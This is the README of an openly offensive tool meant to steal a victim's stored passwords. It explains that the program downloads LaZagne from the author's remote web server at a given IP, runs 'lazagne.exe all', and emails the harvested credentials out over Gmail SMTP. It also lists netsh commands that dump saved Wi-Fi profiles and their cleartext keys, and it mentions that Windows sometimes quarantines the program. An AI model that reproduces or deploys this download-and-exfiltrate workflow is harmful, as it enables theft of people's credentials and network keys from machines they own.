# Send stored passwords of victim
The program downloads the <code>LaZagne</code> tool and use it to obtain saved passwords on the machine and then reports the results of the execution of the following command in a mail for a specified address:
<pre lang="bash"><code>lazagne.exe all</code></pre>
In this case the download is done on a remote machine that works as a web server for the program and so the program makes a GET request for <code>/files/lazagne.exe</code> w.r.t. Web root folder.<br>
In the program, the get request was for the resource <i>http://10.0.2.15/files/lazagne.exe</i> where <i>10.0.2.15</i> is the address of my remote machine that works as Web Server.

### Alternative commands on victim machine
You could also perform the following commands, instead of execution of <code>lazagne.exe</code>:
<details><summary><b><i>Detect all the names of Wi-Fi networks saved on the victim machine</i></b></summary>
<pre lang="bash"><code>netsh wlan show profile</code></pre>
</details>
<details><summary><b><i>Detect info of a specific Wi-Fi network of them saved on the victim machine</i></b></summary>
<pre lang="bash"><code>netsh wlan show profile NAME_NET</code></pre>
where <b>NAME_NET</b> is the name of the network for which we want to obtain info.
</details>
<details><summary><b><i>Detect info of a specific Wi-Fi network and its key of them saved on the victim machine</i></b></summary>
<pre lang="bash"><code>netsh wlan show profile NAME_NET key=clear</code></pre>
where <b>NAME_NET</b> is the name of the network for which we want to obtain info.
</details>

### Credentials file
To run correctly the program, you need to add a file, called <code>credentials.txt</code> in the same directory of the program. The file must contains a line with this info in this format:
<pre lang="bash"><code>example@gmail.com password</code></pre>
where <b>example@gmail.com</b> must be replaced by the google mail (<i>smtp.gmail.com</i> that works on port <i>587</i>) that you want to use and <b>password</b> is the relative password.<br>
Sometimes Windows put the program in quarantine. Remember that you need to abilitate less secure apps reception, because by default Google prevents the reception of e-mail by not trusted apps.

### Run the program
To run the program, you need to install the following dependencies:
```bash
pip3 install smtplib requests
```
or<br>
```bash
pip3 install -r requirements.txt
```